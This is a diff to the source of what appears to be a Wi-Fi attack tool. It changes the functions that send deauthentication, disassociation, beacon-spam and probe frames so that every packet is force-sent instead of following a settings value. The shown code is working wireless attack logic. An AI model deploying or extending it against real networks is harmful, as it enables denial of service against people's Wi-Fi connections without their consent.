@@ -291,7 +291,7 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
     // send deauth frame
     deauthPacket[0] = 0xc0;
 
-    if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets())) {
+    if (sendPacket(deauthPacket, packetSize, ch, 1)) {
         success = true;
         deauth.packetCounter++;
     }
@@ -299,7 +299,7 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
     // send disassociate frame
     deauthPacket[0] = 0xa0;
 
-    if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets())) {
+    if (sendPacket(deauthPacket, packetSize, ch, 1)) {
         success = true;
         deauth.packetCounter++;
     }
@@ -314,7 +314,7 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
         // send deauth frame
         deauthPacket[0] = 0xc0;
 
-        if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets())) {
+        if (sendPacket(deauthPacket, packetSize, ch, 1)) {
             success = true;
             deauth.packetCounter++;
         }
@@ -322,7 +322,7 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
         // send disassociate frame
         deauthPacket[0] = 0xa0;
 
-        if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets())) {
+        if (sendPacket(deauthPacket, packetSize, ch, 1)) {
             success = true;
             deauth.packetCounter++;
         }
@@ -366,7 +366,7 @@ bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
     tmpPacket[37] = ssidLen;                                             // update SSID length byte
     memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13); // copy second half of packet into buffer
 
-    if (sendPacket(tmpPacket, tmpPacketSize, ch, settings.getForcePackets())) {
+    if (sendPacket(tmpPacket, tmpPacketSize, ch, 1)) {
         beacon.time = currentTime;
         beacon.packetCounter++;
         delete tmpPacket; // free memory of allocated buffer
@@ -393,7 +393,7 @@ bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
     memcpy(&probePacket[10], mac, 6);
     memcpy(&probePacket[26], ssid, ssidLen);
 
-    if (sendPacket(probePacket, packetSize, ch, settings.getForcePackets())) {
+    if (sendPacket(probePacket, packetSize, ch, 1)) {
         probe.time = currentTime;
         probe.packetCounter++;
         return true;
